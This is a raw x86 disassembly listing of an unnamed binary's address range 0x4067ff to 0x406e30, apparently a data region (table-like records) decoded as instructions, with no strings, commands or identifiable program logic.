  4067ff:	00 01                	add    %al,(%ecx)
  406801:	00 57 11             	add    %dl,0x11(%edi)
  406804:	00 00                	add    %al,(%eax)
  406806:	01 00                	add    %eax,(%eax)
  406808:	57                   	push   %edi
  406809:	11 00                	adc    %eax,(%eax)
  40680b:	00 01                	add    %al,(%ecx)
  40680d:	00 57 11             	add    %dl,0x11(%edi)
  406810:	00 00                	add    %al,(%eax)
  406812:	01 00                	add    %eax,(%eax)
  406814:	57                   	push   %edi
  406815:	11 00                	adc    %eax,(%eax)
  406817:	00 01                	add    %al,(%ecx)
  406819:	00 57 11             	add    %dl,0x11(%edi)
  40681c:	00 00                	add    %al,(%eax)
  40681e:	01 00                	add    %eax,(%eax)
  406820:	57                   	push   %edi
  406821:	11 00                	adc    %eax,(%eax)
  406823:	00 01                	add    %al,(%ecx)
  406825:	00 57 11             	add    %dl,0x11(%edi)
  406828:	00 00                	add    %al,(%eax)
  40682a:	01 00                	add    %eax,(%eax)
  40682c:	57                   	push   %edi
  40682d:	11 00                	adc    %eax,(%eax)
  40682f:	00 01                	add    %al,(%ecx)
  406831:	00 57 11             	add    %dl,0x11(%edi)
  406834:	00 00                	add    %al,(%eax)
  406836:	01 00                	add    %eax,(%eax)
  406838:	57                   	push   %edi
  406839:	11 00                	adc    %eax,(%eax)
  40683b:	00 01                	add    %al,(%ecx)
  40683d:	00 57 11             	add    %dl,0x11(%edi)
  406840:	00 00                	add    %al,(%eax)
  406842:	01 00                	add    %eax,(%eax)
  406844:	57                   	push   %edi
  406845:	11 00                	adc    %eax,(%eax)
  406847:	00 01                	add    %al,(%ecx)
  406849:	00 57 11             	add    %dl,0x11(%edi)
  40684c:	00 00                	add    %al,(%eax)
  40684e:	01 00                	add    %eax,(%eax)
  406850:	e7 12                	out    %eax,$0x12
  406852:	00 00                	add    %al,(%eax)
  406854:	01 00                	add    %eax,(%eax)
  406856:	3b 12                	cmp    (%edx),%edx
  406858:	00 00                	add    %al,(%eax)
  40685a:	02 00                	add    (%eax),%al
  40685c:	42                   	inc    %edx
  40685d:	12 00                	adc    (%eax),%al
  40685f:	00 01                	add    %al,(%ecx)
  406861:	00 3b                	add    %bh,(%ebx)
  406863:	12 00                	adc    (%eax),%al
  406865:	00 02                	add    %al,(%edx)
  406867:	00 42 12             	add    %al,0x12(%edx)
  40686a:	00 00                	add    %al,(%eax)
  40686c:	01 00                	add    %eax,(%eax)
  40686e:	3b 12                	cmp    (%edx),%edx
  406870:	00 00                	add    %al,(%eax)
  406872:	02 00                	add    (%eax),%al
  406874:	42                   	inc    %edx
  406875:	12 00                	adc    (%eax),%al
  406877:	00 01                	add    %al,(%ecx)
  406879:	00 7f 1e             	add    %bh,0x1e(%edi)
  40687c:	15 00 50 00 39       	adc    $0x39005000,%eax
  406881:	01 52 02             	add    %edx,0x2(%edx)
  406884:	e2 02                	loop   0x406888
  406886:	49                   	dec    %ecx
  406887:	01 52 02             	add    %edx,0x2(%edx)
  40688a:	35 00 51 01 52       	xor    $0x52015100,%eax
  40688f:	02 37                	add    (%edi),%dh
  406891:	01 59 01             	add    %ebx,0x1(%ecx)
  406894:	52                   	push   %edx
  406895:	02 37                	add    (%edi),%dh
  406897:	01 61 01             	add    %esp,0x1(%ecx)
  40689a:	52                   	push   %edx
  40689b:	02 37                	add    (%edi),%dh
  40689d:	01 69 01             	add    %ebp,0x1(%ecx)
  4068a0:	52                   	push   %edx
  4068a1:	02 37                	add    (%edi),%dh
  4068a3:	01 71 01             	add    %esi,0x1(%ecx)
  4068a6:	52                   	push   %edx
  4068a7:	02 37                	add    (%edi),%dh
  4068a9:	01 79 01             	add    %edi,0x1(%ecx)
  4068ac:	52                   	push   %edx
  4068ad:	02 37                	add    (%edi),%dh
  4068af:	01 81 01 52 02 f0    	add    %eax,-0xffdadff(%ecx)
  4068b5:	00 89 01 52 02 35    	add    %cl,0x35025201(%ecx)
  4068bb:	00 91 01 52 02 37    	add    %dl,0x37025201(%ecx)
  4068c1:	01 41 00             	add    %eax,0x0(%ecx)
  4068c4:	52                   	push   %edx
  4068c5:	02 ed                	add    %ch,%ch
  4068c7:	02 99 01 2a 14 f3    	add    -0xcebd5ff(%ecx),%bl
  4068cd:	02 a1 01 40 14 f8    	add    -0x7ebbfff(%ecx),%ah
  4068d3:	02 a9 01 4e 14 3c    	add    0x3c144e01(%ecx),%ch
  4068d9:	00 09                	add    %cl,(%ecx)
  4068db:	00 53 14             	add    %dl,0x14(%ebx)
  4068de:	33 01                	xor    (%ecx),%eax
  4068e0:	09 00                	or     %eax,(%eax)
  4068e2:	52                   	push   %edx
  4068e3:	02 35 00 b1 01 52    	add    0x5201b100,%dh
  4068e9:	02 14 03             	add    (%ebx,%eax,1),%dl
  4068ec:	c1 01 52             	roll   $0x52,(%ecx)
  4068ef:	02 35 00 99 01 8c    	add    0x8c019900,%dh
  4068f5:	14 3f                	adc    $0x3f,%al
  4068f7:	00 61 00             	add    %ah,0x0(%ecx)
  4068fa:	52                   	push   %edx
  4068fb:	02 1b                	add    (%ebx),%bl
  4068fd:	03 69 00             	add    0x0(%ecx),%ebp
  406900:	52                   	push   %edx
  406901:	02 1b                	add    (%ebx),%bl
  406903:	03 29                	add    (%ecx),%ebp
  406905:	00 92 14 35 00 29    	add    %dl,0x29003514(%edx)
  40690b:	00 52 02             	add    %dl,0x2(%edx)
  40690e:	35 00 29 00 98       	xor    $0x98002900,%eax
  406913:	14 21                	adc    $0x21,%al
  406915:	03 29                	add    (%ecx),%ebp
  406917:	00 a4 14 cf 02 c9 01 	add    %ah,0x1c902cf(%esp,%edx,1)
  40691e:	be 14 cf 02 79       	mov    $0x7902cf14,%esi
  406923:	00 ca                	add    %cl,%dl
  406925:	14 ec                	adc    $0xec,%al
  406927:	00 79 00             	add    %bh,0x0(%ecx)
  40692a:	d5 14                	aad    $0x14
  40692c:	ec                   	in     (%dx),%al
  40692d:	00 79 00             	add    %bh,0x0(%ecx)
  406930:	dd 14 ec             	fstl   (%esp,%ebp,8)
  406933:	00 79 00             	add    %bh,0x0(%ecx)
  406936:	e7 14                	out    %eax,$0x14
  406938:	ec                   	in     (%dx),%al
  406939:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40693c:	52                   	push   %edx
  40693d:	02 1b                	add    (%ebx),%bl
  40693f:	03 0c 00             	add    (%eax,%eax,1),%ecx
  406942:	f0 14 2f             	lock adc $0x2f,%al
  406945:	03 71 00             	add    0x0(%ecx),%esi
  406948:	52                   	push   %edx
  406949:	02 37                	add    (%edi),%dh
  40694b:	03 69 00             	add    0x0(%ecx),%ebp
  40694e:	07                   	pop    %es
  40694f:	15 f0 00 69 00       	adc    $0x6900f0,%eax
  406954:	0d 15 f0 00 61       	or     $0x6100f015,%eax
  406959:	00 13                	add    %dl,(%ebx)
  40695b:	15 f0 00 61 00       	adc    $0x6100f0,%eax
  406960:	1e                   	push   %ds
  406961:	15 f0 00 d9 01       	adc    $0x1d900f0,%eax
  406966:	32 15 5a 03 d9 01    	xor    0x1d9035a,%dl
  40696c:	44                   	inc    %esp
  40696d:	15 33 01 21 00       	adc    $0x210133,%eax
  406972:	52                   	push   %edx
  406973:	02 35 00 e1 01 52    	add    0x5201e100,%dh
  406979:	02 60 03             	add    0x3(%eax),%ah
  40697c:	e9 01 77 15 66       	jmp    0x6655e082
  406981:	03 e9                	add    %ecx,%ebp
  406983:	01 9d 15 6d 03 e1    	add    %ebx,-0x1efc92eb(%ebp)
  406989:	00 52 02             	add    %dl,0x2(%edx)
  40698c:	35 00 f9 01 52       	xor    $0x5201f900,%eax
  406991:	02 35 00 01 02 52    	add    0x52020100,%dh
  406997:	02 35 00 c9 01 be    	add    0xbe01c900,%dh
  40699d:	15 37 01 09 02       	adc    $0x2090137,%eax
  4069a2:	52                   	push   %edx
  4069a3:	02 1b                	add    (%ebx),%bl
  4069a5:	03 c9                	add    %ecx,%ecx
  4069a7:	01 cd                	add    %ecx,%ebp
  4069a9:	15 74 03 11 02       	adc    $0x2110374,%eax
  4069ae:	e1 15                	loope  0x4069c5
  4069b0:	7b 03                	jnp    0x4069b5
  4069b2:	11 02                	adc    %eax,(%edx)
  4069b4:	ed                   	in     (%dx),%eax
  4069b5:	15 84 03 19 02       	adc    $0x2190384,%eax
  4069ba:	f8                   	clc
  4069bb:	15 ec 00 21 02       	adc    $0x22100ec,%eax
  4069c0:	52                   	push   %edx
  4069c1:	02 1b                	add    (%ebx),%bl
  4069c3:	03 c9                	add    %ecx,%ecx
  4069c5:	01 02                	add    %eax,(%edx)
  4069c7:	16                   	push   %ss
  4069c8:	8a 03                	mov    (%ebx),%al
  4069ca:	c9                   	leave
  4069cb:	01 12                	add    %edx,(%edx)
  4069cd:	16                   	push   %ss
  4069ce:	cf                   	iret
  4069cf:	02 c9                	add    %cl,%cl
  4069d1:	01 31                	add    %esi,(%ecx)
  4069d3:	16                   	push   %ss
  4069d4:	91                   	xchg   %eax,%ecx
  4069d5:	03 29                	add    (%ecx),%ebp
  4069d7:	02 3e                	add    (%esi),%bh
  4069d9:	16                   	push   %ss
  4069da:	97                   	xchg   %eax,%edi
  4069db:	03 f9                	add    %ecx,%edi
  4069dd:	01 42 16             	add    %eax,0x16(%edx)
  4069e0:	cf                   	iret
  4069e1:	02 c9                	add    %cl,%cl
  4069e3:	01 ca                	add    %ecx,%edx
  4069e5:	14 ec                	adc    $0xec,%al
  4069e7:	00 c9                	add    %cl,%cl
  4069e9:	01 dd                	add    %ebx,%ebp
  4069eb:	14 ec                	adc    $0xec,%al
  4069ed:	00 c9                	add    %cl,%cl
  4069ef:	01 5c 16 9e          	add    %ebx,-0x62(%esi,%edx,1)
  4069f3:	03 a1 01 66 16 a6    	add    -0x59e999ff(%ecx),%esp
  4069f9:	03 01                	add    (%ecx),%eax
  4069fb:	02 75 16             	add    0x16(%ebp),%dh
  4069fe:	ab                   	stos   %eax,%es:(%edi)
  4069ff:	03 31                	add    (%ecx),%esi
  406a01:	02 8b 16 b1 03 29    	add    0x2903b116(%ebx),%cl
  406a07:	00 8f 16 8a 03 29    	add    %cl,0x29038a16(%edi)
  406a0d:	02 9e 16 b7 03 29    	add    0x2903b716(%esi),%bl
  406a13:	00 b7 16 bf 03 29    	add    %dh,0x2903bf16(%edi)
  406a19:	00 dd                	add    %bl,%ch
  406a1b:	16                   	push   %ss
  406a1c:	c6 03 49             	movb   $0x49,(%ebx)
  406a1f:	02 f8                	add    %al,%bh
  406a21:	16                   	push   %ss
  406a22:	cd 03                	int    $0x3
  406a24:	49                   	dec    %ecx
  406a25:	02 0d 17 33 01 51    	add    0x51013317,%cl
  406a2b:	02 1f                	add    (%edi),%bl
  406a2d:	17                   	pop    %ss
  406a2e:	d3 03                	roll   %cl,(%ebx)
  406a30:	29 00                	sub    %eax,(%eax)
  406a32:	35 17 da 03 29       	xor    $0x2903da17,%eax
  406a37:	00 3e                	add    %bh,(%esi)
  406a39:	17                   	pop    %ss
  406a3a:	cf                   	iret
  406a3b:	02 29                	add    (%ecx),%ch
  406a3d:	00 4e 17             	add    %cl,0x17(%esi)
  406a40:	cf                   	iret
  406a41:	02 29                	add    (%ecx),%ch
  406a43:	00 6d 17             	add    %ch,0x17(%ebp)
  406a46:	e1 03                	loope  0x406a4b
  406a48:	29 00                	sub    %eax,(%eax)
  406a4a:	7e 17                	jle    0x406a63
  406a4c:	e1 03                	loope  0x406a51
  406a4e:	29 00                	sub    %eax,(%eax)
  406a50:	8f                   	(bad)
  406a51:	17                   	pop    %ss
  406a52:	e8 03 c9 01 9a       	call   0x9a42335a
  406a57:	17                   	pop    %ss
  406a58:	33 01                	xor    (%ecx),%eax
  406a5a:	14 00                	adc    $0x0,%al
  406a5c:	a3 17 ec 00 69       	mov    %eax,0x6900ec17
  406a61:	02 52 02             	add    0x2(%edx),%dl
  406a64:	35 00 14 00 cf       	xor    $0xcf001400,%eax
  406a69:	17                   	pop    %ss
  406a6a:	0f 04                	(bad)
  406a6c:	1c 00                	sbb    $0x0,%al
  406a6e:	dd 17                	fstl   (%edi)
  406a70:	21 04 61             	and    %eax,(%ecx,%eiz,2)
  406a73:	02 52 02             	add    0x2(%edx),%dl
  406a76:	35 00 a1 00 e9       	xor    $0xe900a100,%eax
  406a7b:	17                   	pop    %ss
  406a7c:	33 01                	xor    (%ecx),%eax
  406a7e:	61                   	popa
  406a7f:	02 f3                	add    %bl,%dh
  406a81:	17                   	pop    %ss
  406a82:	cf                   	iret
  406a83:	02 c9                	add    %cl,%cl
  406a85:	01 f8                	add    %edi,%eax
  406a87:	15 ec 00 c9 01       	adc    $0x1c900ec,%eax
  406a8c:	ff 17                	call   *(%edi)
  406a8e:	ec                   	in     (%dx),%al
  406a8f:	00 c9                	add    %cl,%cl
  406a91:	01 13                	add    %edx,(%ebx)
  406a93:	15 f0 00 c9 01       	adc    $0x1c900f0,%eax
  406a98:	1e                   	push   %ds
  406a99:	15 f0 00 a1 00       	adc    $0xa100f0,%eax
  406a9e:	0a 18                	or     (%eax),%bl
  406aa0:	33 01                	xor    (%ecx),%eax
  406aa2:	69 02 1a 18 26 04    	imul   $0x426181a,(%edx),%eax
  406aa8:	79 02                	jns    0x406aac
  406aaa:	44                   	inc    %esp
  406aab:	18 06                	sbb    %al,(%esi)
  406aad:	01 81 02 59 18 35    	add    %eax,0x35185902(%ecx)
  406ab3:	00 69 02             	add    %ch,0x2(%ecx)
  406ab6:	61                   	popa
  406ab7:	18 cf                	sbb    %cl,%bh
  406ab9:	02 61 02             	add    0x2(%ecx),%ah
  406abc:	70 18                	jo     0x406ad6
  406abe:	06                   	push   %es
  406abf:	01 41 00             	add    %eax,0x0(%ecx)
  406ac2:	52                   	push   %edx
  406ac3:	02 f0                	add    %al,%dh
  406ac5:	00 91 02 52 02 65    	add    %dl,0x65025202(%ecx)
  406acb:	04 c9                	add    $0xc9,%al
  406acd:	01 91 18 6b 04 c9    	add    %edx,-0x36fb94e8(%ecx)
  406ad3:	01 9d 18 6b 04 b1    	add    %ebx,-0x4efb94e8(%ebp)
  406ad9:	00 a7 18 ec 00 81    	add    %ah,-0x7eff13e8(%edi)
  406adf:	00 b4 18 f0 00 b1 00 	add    %dh,0xb100f0(%eax,%ebx,1)
  406ae6:	c7                   	(bad)
  406ae7:	18 72 04             	sbb    %dh,0x4(%edx)
  406aea:	b1 00                	mov    $0x0,%cl
  406aec:	d3 18                	rcrl   %cl,(%eax)
  406aee:	06                   	push   %es
  406aef:	01 b1 00 dd 18 06    	add    %esi,0x618dd00(%ecx)
  406af5:	01 b1 00 e5 18 06    	add    %esi,0x618e500(%ecx)
  406afb:	01 99 01 f1 18 77    	add    %ebx,0x7718f101(%ecx)
  406b01:	04 81                	add    $0x81,%al
  406b03:	00 fb                	add    %bh,%bl
  406b05:	18 7c 04 81          	sbb    %bh,-0x7f(%esp,%eax,1)
  406b09:	00 09                	add    %cl,(%ecx)
  406b0b:	19 cf                	sbb    %ecx,%edi
  406b0d:	02 81 00 26 19 81    	add    -0x7ee6da00(%ecx),%al
  406b13:	04 81                	add    $0x81,%al
  406b15:	00 3a                	add    %bh,(%edx)
  406b17:	19 88 04 b1 00 4e    	sbb    %ecx,0x4e00b104(%eax)
  406b1d:	19 72 04             	sbb    %esi,0x4(%edx)
  406b20:	c9                   	leave
  406b21:	00 5c 19 8e          	add    %bl,-0x72(%ecx,%ebx,1)
  406b25:	04 c9                	add    $0xc9,%al
  406b27:	00 66 19             	add    %ah,0x19(%esi)
  406b2a:	8e 04 c9             	mov    (%ecx,%ecx,8),%es
  406b2d:	00 6f 19             	add    %ch,0x19(%edi)
  406b30:	8e 04 a1             	mov    (%ecx,%eiz,4),%es
  406b33:	02 88 19 93 04 c9    	add    -0x36fb6ce7(%eax),%cl
  406b39:	00 91 19 8e 04 c9    	add    %dl,-0x36fb71e7(%ecx)
  406b3f:	00 9d 19 8e 04 c9    	add    %bl,-0x36fb71e7(%ebp)
  406b45:	00 a5 19 8e 04 c9    	add    %ah,-0x36fb71e7(%ebp)
  406b4b:	00 af 19 8e 04 c9    	add    %ch,-0x36fb71e7(%edi)
  406b51:	01 ba 19 35 00 a9    	add    %edi,-0x56ffcae7(%edx)
  406b57:	02 da                	add    %dl,%bl
  406b59:	19 cf                	sbb    %ecx,%edi
  406b5b:	02 c9                	add    %cl,%cl
  406b5d:	01 e9                	add    %ebp,%ecx
  406b5f:	19 9e 04 29 00 f7    	sbb    %ebx,-0x8ffd6fc(%esi)
  406b65:	19 cf                	sbb    %ecx,%edi
  406b67:	02 c9                	add    %cl,%cl
  406b69:	01 06                	add    %eax,(%esi)
  406b6b:	1a 35 00 b1 02 52    	sbb    0x5202b100,%dh
  406b71:	02 65 04             	add    0x4(%ebp),%ah
  406b74:	b9 00 27 1a a4       	mov    $0xa41a2700,%ecx
  406b79:	04 b9                	add    $0xb9,%al
  406b7b:	00 33                	add    %dh,(%ebx)
  406b7d:	1a 21                	sbb    (%ecx),%ah
  406b7f:	03 b9 00 40 1a cf    	add    -0x30e5c000(%ecx),%edi
  406b85:	02 b9 00 4e 1a 35    	add    0x351a4e00(%ecx),%bh
  406b8b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406b8e:	54                   	push   %esp
  406b8f:	1a b2 04 e9 00 5d    	sbb    0x5d00e904(%edx),%dh
  406b95:	1a f0                	sbb    %al,%dh
  406b97:	00 c9                	add    %cl,%cl
  406b99:	01 67 1a             	add    %esp,0x1a(%edi)
  406b9c:	35 00 c9 01 6f       	xor    $0x6f01c900,%eax
  406ba1:	1a f0                	sbb    %al,%dh
  406ba3:	00 c9                	add    %cl,%cl
  406ba5:	01 78 1a             	add    %edi,0x1a(%eax)
  406ba8:	f0 00 c9             	lock add %cl,%cl
  406bab:	01 85 1a b8 04 b9    	add    %eax,-0x46fb47e6(%ebp)
  406bb1:	02 52 02             	add    0x2(%edx),%dl
  406bb4:	be 04 c9 01 98       	mov    $0x9801c904,%esi
  406bb9:	1a c8                	sbb    %al,%cl
  406bbb:	04 e9                	add    $0xe9,%al
  406bbd:	00 52 02             	add    %dl,0x2(%edx)
  406bc0:	35 00 e9 00 b2       	xor    $0xb200e900,%eax
  406bc5:	1a cf                	sbb    %bh,%cl
  406bc7:	04 c9                	add    $0xc9,%al
  406bc9:	01 bc 1a 9e 04 c9 01 	add    %edi,0x1c9049e(%edx,%ebx,1)
  406bd0:	ca 1a 8a             	lret   $0x8a1a
  406bd3:	03 24 00             	add    (%eax,%eax,1),%esp
  406bd6:	a3 17 ec 00 b9       	mov    %eax,0xb900ec17
  406bdb:	00 52 02             	add    %dl,0x2(%edx)
  406bde:	35 00 24 00 52       	xor    $0x52002400,%eax
  406be3:	02 35 00 d9 00 d3    	add    0xd300d900,%dh
  406be9:	1a ec                	sbb    %ah,%ch
  406beb:	00 d9                	add    %bl,%cl
  406bed:	00 f5                	add    %dh,%ch
  406bef:	1a d6                	sbb    %dh,%dl
  406bf1:	04 29                	add    $0x29,%al
  406bf3:	02 04 1b             	add    (%ebx,%ebx,1),%al
  406bf6:	97                   	xchg   %eax,%edi
  406bf7:	03 d9                	add    %ecx,%ebx
  406bf9:	02 59 18             	add    0x18(%ecx),%bl
  406bfc:	35 00 24 00 2b       	xor    $0x2b002400,%eax
  406c01:	1b f0                	sbb    %eax,%esi
  406c03:	00 b9 00 34 1b 35    	add    %bh,0x351b3400(%ecx)
  406c09:	00 19                	add    %bl,(%ecx)
  406c0b:	02 ff                	add    %bh,%bh
  406c0d:	17                   	pop    %ss
  406c0e:	ec                   	in     (%dx),%al
  406c0f:	00 29                	add    %ch,(%ecx)
  406c11:	00 cd                	add    %cl,%ch
  406c13:	15 74 03 d9 00       	adc    $0xd90374,%eax
  406c18:	39 1b                	cmp    %ebx,(%ebx)
  406c1a:	ec                   	in     (%dx),%al
  406c1b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406c1e:	3e 16                	ds push %ss
  406c20:	dc 04 24             	faddl  (%esp)
  406c23:	00 4e 1b             	add    %cl,0x1b(%esi)
  406c26:	e2 04                	loop   0x406c2c
  406c28:	d9 00                	flds   (%eax)
  406c2a:	55                   	push   %ebp
  406c2b:	1b 33                	sbb    (%ebx),%esi
  406c2d:	01 d9                	add    %ebx,%ecx
  406c2f:	00 62 1b             	add    %ah,0x1b(%edx)
  406c32:	33 01                	xor    (%ecx),%eax
  406c34:	d9 00                	flds   (%eax)
  406c36:	78 1b                	js     0x406c53
  406c38:	ec                   	in     (%dx),%al
  406c39:	00 d9                	add    %bl,%cl
  406c3b:	00 8c 1b ec 00 e1 02 	add    %cl,0x2e100ec(%ebx,%ebx,1)
  406c42:	52                   	push   %edx
  406c43:	02 e9                	add    %cl,%ch
  406c45:	04 e1                	add    $0xe1,%al
  406c47:	02 aa 1b f0 04 e1    	add    -0x1efb0fe5(%edx),%ch
  406c4d:	02 bf 1b ec 00 e1    	add    -0x1eff13e5(%edi),%bh
  406c53:	02 cb                	add    %bl,%cl
  406c55:	1b ec                	sbb    %esp,%ebp
  406c57:	00 99 01 d7 1b f4    	add    %bl,-0xbe428ff(%ecx)
  406c5d:	04 99                	add    $0x99,%al
  406c5f:	01 de                	add    %ebx,%esi
  406c61:	1b fc                	sbb    %esp,%edi
  406c63:	04 d9                	add    $0xd9,%al
  406c65:	00 e5                	add    %ah,%ch
  406c67:	1b 33                	sbb    (%ebx),%esi
  406c69:	01 f1                	add    %esi,%ecx
  406c6b:	02 06                	add    (%esi),%al
  406c6d:	1c 02                	sbb    $0x2,%al
  406c6f:	05 31 00 52 02       	add    $0x2520031,%eax
  406c74:	35 00 f9 02 66       	xor    $0x6602f900,%eax
  406c79:	07                   	pop    %es
  406c7a:	3a 05 2c 00 52 02    	cmp    0x252002c,%al
  406c80:	35 00 34 00 cf       	xor    $0xcf003400,%eax
  406c85:	17                   	pop    %ss
  406c86:	0f 04                	(bad)
  406c88:	3c 00                	cmp    $0x0,%al
  406c8a:	dd 17                	fstl   (%edi)
  406c8c:	21 04 01             	and    %eax,(%ecx,%eax,1)
  406c8f:	01 27                	add    %esp,(%edi)
  406c91:	1c 33                	sbb    $0x33,%al
  406c93:	01 01                	add    %eax,(%ecx)
  406c95:	03 5c 1c 5a          	add    0x5a(%esp,%ebx,1),%ebx
  406c99:	05 01 03 6e 1c       	add    $0x1c6e0301,%eax
  406c9e:	63 05 01 03 76 1c    	arpl   %eax,0x1c760301
  406ca4:	06                   	push   %es
  406ca5:	01 01                	add    %eax,(%ecx)
  406ca7:	03 82 1c 6a 05 11    	add    0x11056a1c(%edx),%eax
  406cad:	03 53 14             	add    0x14(%ebx),%edx
  406cb0:	33 01                	xor    (%ecx),%eax
  406cb2:	99                   	cltd
  406cb3:	01 de                	add    %ebx,%esi
  406cb5:	1b 70 05             	sbb    0x5(%eax),%esi
  406cb8:	01 03                	add    %eax,(%ebx)
  406cba:	96                   	xchg   %eax,%esi
  406cbb:	1c 77                	sbb    $0x77,%al
  406cbd:	05 01 03 a6 1c       	add    $0x1ca60301,%eax
  406cc2:	81 05 01 03 e7 1c 87 	addl   $0x3190587,0x1ce70301
  406cc9:	05 19 03 
  406ccc:	f6 1c 9b             	negb   (%ebx,%ebx,4)
  406ccf:	05 01 01 17 0d       	add    $0xd170101,%eax
  406cd4:	33 01                	xor    (%ecx),%eax
  406cd6:	99                   	cltd
  406cd7:	01 d7                	add    %edx,%edi
  406cd9:	1b a1 05 31 00 ae    	sbb    -0x51ffcefb(%ecx),%esp
  406cdf:	0b 33                	or     (%ebx),%esi
  406ce1:	01 39                	add    %edi,(%ecx)
  406ce3:	03 05 1d a8 05 01    	add    0x105a81d,%eax
  406ce9:	03 10                	add    (%eax),%edx
  406ceb:	1d b0 05 f9 00       	sbb    $0xf905b0,%eax
  406cf0:	52                   	push   %edx
  406cf1:	02 be 05 2c 00 3e    	add    0x3e002c05(%esi),%bh
  406cf7:	16                   	push   %ss
  406cf8:	c3                   	ret
  406cf9:	05 01 03 23 1d       	add    $0x1d230301,%eax
  406cfe:	cb                   	lret
  406cff:	05 99 01 d7 1b       	add    $0x1bd70199,%eax
  406d04:	d5 05                	aad    $0x5
  406d06:	01 01                	add    %eax,(%ecx)
  406d08:	0a 18                	or     (%eax),%bl
  406d0a:	33 01                	xor    (%ecx),%eax
  406d0c:	99                   	cltd
  406d0d:	01 31                	add    %esi,(%ecx)
  406d0f:	1d db 05 31 00       	sbb    $0x3105db,%eax
  406d14:	1b 0c 37             	sbb    (%edi,%esi,1),%ecx
  406d17:	01 01                	add    %eax,(%ecx)
  406d19:	01 3d 1d 8d 02 31    	add    %edi,0x31028d1d
  406d1f:	00 f7                	add    %dh,%bh
  406d21:	0b 37                	or     (%edi),%esi
  406d23:	01 31                	add    %esi,(%ecx)
  406d25:	00 7a 0b             	add    %bh,0xb(%edx)
  406d28:	45                   	inc    %ebp
  406d29:	02 31                	add    (%ecx),%dh
  406d2b:	00 e0                	add    %ah,%al
  406d2d:	0b 54 02 11          	or     0x11(%edx,%eax,1),%edx
  406d31:	01 52 02             	add    %edx,0x2(%edx)
  406d34:	35 00 99 01 58       	xor    $0x58019900,%eax
  406d39:	1d 24 06 11 01       	sbb    $0x1110624,%eax
  406d3e:	64 1d 7c 04 09 01    	fs sbb $0x109047c,%eax
  406d44:	52                   	push   %edx
  406d45:	02 29                	add    (%ecx),%ch
  406d47:	06                   	push   %es
  406d48:	51                   	push   %ecx
  406d49:	03 1d 06 41 06 59    	add    0x59064106,%ebx
  406d4f:	03 91 1d 48 06 51    	add    0x5106481d(%ecx),%edx
  406d55:	03 1b                	add    (%ebx),%ebx
  406d57:	0c 02                	or     $0x2,%al
  406d59:	05 11 01 99 1d       	add    $0x1d990111,%eax
  406d5e:	ec                   	in     (%dx),%al
  406d5f:	00 11                	add    %dl,(%ecx)
  406d61:	01 2b                	add    %ebp,(%ebx)
  406d63:	1b f0                	sbb    %eax,%esi
  406d65:	00 51 03             	add    %dl,0x3(%ecx)
  406d68:	f7 0b 4e 06 59 03    	testl  $0x359064e,(%ebx)
  406d6e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406d6f:	1d 53 06 99 01       	sbb    $0x1990653,%eax
  406d74:	99                   	cltd
  406d75:	1d ec 00 c9 01       	sbb    $0x1c900ec,%eax
  406d7a:	66 07                	popw   %es
  406d7c:	35 00 69 03 c8       	xor    $0xc8036900,%eax
  406d81:	1d 6a 06 69 03       	sbb    $0x369066a,%eax
  406d86:	e0 0c                	loopne 0x406d94
  406d88:	96                   	xchg   %eax,%esi
  406d89:	02 69 03             	add    0x3(%ecx),%ch
  406d8c:	f3 0c 96             	repz or $0x96,%al
  406d8f:	02 21                	add    (%ecx),%ah
  406d91:	01 da                	add    %ebx,%edx
  406d93:	1d 70 06 39 00       	sbb    $0x390670,%eax
  406d98:	52                   	push   %edx
  406d99:	02 35 00 f9 00 e2    	add    0xe200f900,%dh
  406d9f:	1d 76 06 29 01       	sbb    $0x1290676,%eax
  406da4:	52                   	push   %edx
  406da5:	02 9e 03 71 03 52    	add    0x52037103(%esi),%bl
  406dab:	02 37                	add    (%edi),%dh
  406dad:	01 79 03             	add    %edi,0x3(%ecx)
  406db0:	52                   	push   %edx
  406db1:	02 35 00 89 03 a1    	add    0xa1038900,%dh
  406db7:	1e                   	push   %ds
  406db8:	ec                   	in     (%dx),%al
  406db9:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  406dbd:	1a b2 04 a1 03 ab    	sbb    -0x54fc5efc(%edx),%dh
  406dc3:	1e                   	push   %ds
  406dc4:	9e                   	sahf
  406dc5:	06                   	push   %es
  406dc6:	49                   	dec    %ecx
  406dc7:	03 b9 1e 33 01 31    	add    0x3101331e(%ecx),%edi
  406dcd:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  406dd0:	37                   	aaa
  406dd1:	01 4c 00 54          	add    %ecx,0x54(%eax,%eax,1)
  406dd5:	1a b2 04 91 03 c5    	sbb    -0x3afc6efc(%edx),%dh
  406ddb:	1e                   	push   %ds
  406ddc:	06                   	push   %es
  406ddd:	01 a9 03 e5 1e 06    	add    %ebp,0x61ee503(%ecx)
  406de3:	01 f1                	add    %esi,%ecx
  406de5:	02 e9                	add    %cl,%ch
  406de7:	1e                   	push   %ds
  406de8:	02 05 81 03 52 02    	add    0x2520381,%al
  406dee:	cf                   	iret
  406def:	02 b1 03 52 02 65    	add    0x65025203(%ecx),%dh
  406df5:	04 d9                	add    $0xd9,%al
  406df7:	01 1b                	add    %ebx,(%ebx)
  406df9:	1f                   	pop    %ds
  406dfa:	ac                   	lods   %ds:(%esi),%al
  406dfb:	06                   	push   %es
  406dfc:	b9 03 72 1f b3       	mov    $0xb31f7203,%ecx
  406e01:	06                   	push   %es
  406e02:	c1 03 90             	roll   $0x90,(%ebx)
  406e05:	1f                   	pop    %ds
  406e06:	bb 06 c1 03 a3       	mov    $0xa303c106,%ebx
  406e0b:	1f                   	pop    %ds
  406e0c:	35 00 d1 03 b3       	xor    $0xb303d100,%eax
  406e11:	1f                   	pop    %ds
  406e12:	c2 06 d1             	ret    $0xd106
  406e15:	03 ba 1f c8 06 d1    	add    -0x2ef937e1(%edx),%edi
  406e1b:	03 d5                	add    %ebp,%edx
  406e1d:	1f                   	pop    %ds
  406e1e:	cf                   	iret
  406e1f:	06                   	push   %es
  406e20:	d9 03                	flds   (%ebx)
  406e22:	e1 1f                	loope  0x406e43
  406e24:	d5 06                	aad    $0x6
  406e26:	54                   	push   %esp
  406e27:	00 52 02             	add    %dl,0x2(%edx)
  406e2a:	65 04 44             	gs add $0x44,%al
  406e2d:	00 fa                	add    %bh,%dl
  406e2f:	1f                   	pop    %ds
  406e30:	e9 06 5c 00 52       	jmp    0x5240ca3b
